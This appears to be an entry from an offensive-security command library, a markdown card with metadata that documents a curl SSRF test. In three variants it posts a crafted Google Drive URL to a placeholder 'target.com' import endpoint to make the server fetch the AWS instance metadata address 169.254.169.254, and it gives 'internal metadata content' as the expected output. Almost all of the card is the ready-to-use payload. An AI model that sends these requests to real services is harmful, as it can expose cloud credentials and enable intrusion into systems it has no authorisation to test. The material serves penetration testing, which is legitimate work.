---
id: c1d2e3f4-g5h6-7890-ijkl-mn4567890123
data: >-
  curl -X POST 'https://target.com/api/import-from-drive' -H 'Content-Type:
  application/json' -d '{"url":
  "https://drive.google.com/uc?id=internal&redirect=169.254.169.254/latest/meta-data/"}'
tags:
  - ssrf
  - test
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:33:24.206Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-test

## Command

```bash
curl -X POST 'https://target.com/api/import-from-drive' -H 'Content-Type: application/json' -d '{"url": "https://drive.google.com/uc?id=internal&redirect=169.254.169.254/latest/meta-data/"}'
```

## Description

Sends a POST request to test SSRF via Google Drive endpoint, attempting to redirect to AWS metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON header | Yes |
| `-d '{...}'` | Payload with malicious URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/api/import-from-drive' -H 'Content-Type: application/json' -d '{"url": "https://drive.google.com/uc?id=internal&redirect=169.254.169.254"}'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/api/import-from-drive' -H 'Cookie: session=abc' -d '{"url": "https://drive.google.com/uc?export=download&id=ssrf&internal=http://169.254.169.254"}'
```

## Expected Output

Server response with internal metadata content or error indicating fetch attempt.

## Related

- [[commands/curl-metadata-fetch]]
- [[procedures/Craft-SSRF-Payload-via-Google-Drive]]
